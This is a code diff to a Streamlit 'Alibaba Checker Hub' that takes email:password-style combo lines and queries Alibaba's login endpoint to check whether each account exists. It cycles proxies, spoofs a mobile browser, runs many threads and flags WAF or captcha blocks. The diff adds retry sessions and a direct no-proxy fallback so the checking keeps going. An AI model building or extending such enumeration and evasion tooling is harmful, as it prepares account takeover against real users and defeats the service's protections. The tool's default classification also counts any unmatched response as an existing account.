@@ -5,6 +5,8 @@ import random
 import uuid
 import time
 import requests
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 import json
 import threading
 from datetime import datetime
@@ -22,7 +24,7 @@ st.set_page_config(
 )
 
 st.title("📦 Positive Alibaba Checker Hub")
-st.caption("Advanced automated Alibaba account existence checker powered by high-speed HTTP proxy workers and deep verbose telemetry.")
+st.caption("Advanced automated Alibaba account existence checker powered by resilient session pools and deep verbose diagnostic telemetry.")
 
 if "proxy_logs" not in st.session_state:
     st.session_state.proxy_logs = []
@@ -47,7 +49,7 @@ def log_startup(msg):
     if entry not in st.session_state.startup_entries:
         st.session_state.startup_entries.append(entry)
 
-log_startup("Alibaba Checker Hub initialized with deep verbose telemetry engine v2.10.")
+log_startup("Alibaba Checker Hub initialized with deep verbose diagnostic telemetry engine v2.10.")
 
 def add_proxy_log(msg: str):
     timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
@@ -424,21 +426,33 @@ with tab2:
 
             def classify(text):
                 text = text or ""
-                # More targeted check for actual server response error messages
-                if "account does not exist" in text.lower() or "not exist" in text.lower():
-                    return "not_linked", "Account does not exist"
-                if "captcha" in text.lower() or "blocked" in text.lower():
-                    return "error", "Captcha / blocked"
-                return "linked", "Account exists / Linked"
+                lowered = text.lower()
+                if "account does not exist" in lowered or "not exist" in lowered or "invalid email" in lowered:
+                    return "not_linked", "Account does not exist (Matched pattern)"
+                if "captcha" in lowered or "blocked" in lowered or "forbidden" in lowered:
+                    return "error", "Blocked by WAF / Captcha"
+                return "linked", "Account exists / Linked (Default fallback)"
 
             def check_single_account(args):
                 idx, line = args
                 email = line.split(":", 1)[0].strip()
                 ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
                 
-                for attempt in range(2):
-                    proxies = get_next_proxy()
-                    proxy_host_display = proxies['http'].split('@')[-1] if proxies else "DIRECT"
+                # Thread-local persistent session with retry adapters
+                session = requests.Session()
+                retries = Retry(total=1, backoff_factor=0.2, status_forcelist=[500, 502, 503, 504])
+                session.mount("https://", HTTPAdapter(max_retries=retries))
+                session.mount("http://", HTTPAdapter(max_retries=retries))
+
+                for attempt in range(3):
+                    # Attempt 2 is a direct fallback connection
+                    if attempt == 2:
+                        proxies = None
+                        proxy_host_display = "DIRECT (No Proxy Fallback)"
+                    else:
+                        proxies = get_next_proxy()
+                        proxy_host_display = proxies['http'].split('@')[-1] if proxies else "DIRECT"
+
                     headers = {
                         "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -446,40 +460,36 @@ with tab2:
                         "Referer": "https://login.alibaba.com/"
                     }
                     try:
-                        # Construct exact target URL and log full pattern details
                         url = f"https://login.alibaba.com/mini_login.htm?scene=h5&appName=icbu&appEntrance=icbu_h5&isMobile=true&loginId={email}"
                         
                         start_req = time.time()
-                        r = requests.get(url, headers=headers, proxies=proxies, timeout=12)
+                        r = session.get(url, headers=headers, proxies=proxies, timeout=10)
                         elapsed = int((time.time() - start_req) * 1000)
                         
-                        # Extract a sample snippet of response text for logging pattern visibility
-                        snippet = r.text.replace("\n", " ")[:150]
+                        snippet = r.text.replace("\n", " ")[:120]
                         
                         if r.status_code == 200:
                             status, detail = classify(r.text)
                             icon = "✅" if status == "linked" else "❌"
                             log_msg = (
-                                f"[{ts}] [{idx}/{len(accounts)}] {email} | "
-                                f"Proxy: {proxy_host_display} | "
-                                f"URL: {url} | "
-                                f"HTTP 200 ({elapsed}ms) | "
-                                f"Status: {icon} {status.upper()} | "
-                                f"Snippet: [{snippet}]"
+                                f"[{ts}] [{idx}/{len(accounts)}] [Attempt {attempt+1}] {email} | "
+                                f"Proxy/Route: {proxy_host_display} | URL: {url} | "
+                                f"HTTP 200 ({elapsed}ms) | Status: {icon} {status.upper()} | "
+                                f"Detail: {detail} | Len: {len(r.text)} | Snippet: [{snippet}]"
                             )
                             return status, line, log_msg
                         else:
-                            if attempt == 1:
-                                log_msg = f"[{ts}] [{idx}/{len(accounts)}] {email} | URL: {url} | Status: ⚠️ ERROR | HTTP Status {r.status_code}"
+                            if attempt == 2:
+                                log_msg = f"[{ts}] [{idx}/{len(accounts)}] [Attempt {attempt+1}] {email} | Route: {proxy_host_display} | Status: ⚠️ ERROR | HTTP Status {r.status_code}"
                                 return "error", f"{line} # HTTP Status {r.status_code}", log_msg
                     except Exception as e:
-                        if attempt == 1:
-                            err_msg = str(e)[:60]
-                            log_msg = f"[{ts}] [{idx}/{len(accounts)}] {email} | Status: ⚠️ ERROR | Detail: {err_msg}"
+                        if attempt == 2:
+                            err_msg = str(e)[:50]
+                            log_msg = f"[{ts}] [{idx}/{len(accounts)}] [Attempt {attempt+1}] {email} | Route: {proxy_host_display} | Status: ⚠️ ERROR | Exception: {err_msg}"
                             return "error", f"{line} # {err_msg}", log_msg
-                return "error", f"{line} # Connection failed", f"[{ts}] [{idx}/{len(accounts)}] {email} | Status: ⚠️ ERROR | Detail: Connection failed after retries"
+                return "error", f"{line} # Max retries & direct fallback failed", f"[{ts}] [{idx}/{len(accounts)}] {email} | Status: ⚠️ ERROR | Max retries and direct fallback exhausted"
 
-            with st.spinner("Checking accounts via high-speed HTTP proxy workers..."):
+            with st.spinner("Checking accounts via resilient HTTP proxy workers and direct fallback..."):
                 from concurrent.futures import ThreadPoolExecutor, as_completed
                 tasks = [(idx, line) for idx, line in enumerate(accounts, 1)]
                 with ThreadPoolExecutor(max_workers=max_workers) as executor:
